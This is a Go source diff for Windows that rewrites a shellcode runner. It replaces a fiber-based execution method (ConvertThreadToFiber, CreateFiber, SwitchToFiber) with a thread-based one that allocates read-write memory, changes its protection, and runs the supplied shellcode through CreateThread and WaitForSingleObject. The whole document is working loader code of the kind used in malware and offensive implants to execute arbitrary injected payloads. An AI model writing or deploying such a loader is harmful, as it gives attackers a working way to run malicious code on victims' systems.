@@ -8,17 +8,11 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func Fiber(shellcode []byte) error {
-	fiberAddr, ctErr := xwindows.ConvertThreadToFiber(0)
-	if ctErr != nil {
-		return fmt.Errorf("ConvertThreadToFiber failed: %w", ctErr)
-	}
-
+func CreateThread(shellcode []byte) error {
 	addr, vaErr := xwindows.VirtualAlloc(
 		0,
 		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
+		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
 	)
 	if addr == 0 {
 		return fmt.Errorf("VirtualAlloc failed: %v", vaErr)
@@ -44,19 +38,24 @@ func Fiber(shellcode []byte) error {
 		return fmt.Errorf("VirtualProtect failed: %v", vpErr)
 	}
 
-	fiber, cfErr := xwindows.CreateFiber(0, addr, 0)
-	if cfErr != nil {
-		return fmt.Errorf("CreateFiber failed: %v", cfErr)
+	thread, ctErr := xwindows.CreateThread(
+		0,
+		0,
+		addr,
+		uintptr(0),
+		0,
+		0,
+	)
+	if ctErr != nil {
+		return fmt.Errorf("CreateThread failed: %v", ctErr)
 	}
 
-	_, sfErr := xwindows.SwitchToFiber(fiber)
-	if sfErr != nil {
-		return fmt.Errorf("SwitchToFiber failed: %v", sfErr)
-	}
-
-	_, sfAddrErr := xwindows.SwitchToFiber(fiberAddr)
-	if sfAddrErr != nil {
-		return fmt.Errorf("SwitchToFiber addr failed: %v", sfAddrErr)
+	_, wsErr := xwindows.WaitForSingleObject(
+		thread,
+		windows.INFINITE,
+	)
+	if wsErr != nil {
+		return fmt.Errorf("WaitForSingleObject failed: %v", wsErr)
 	}
 
 	return nil
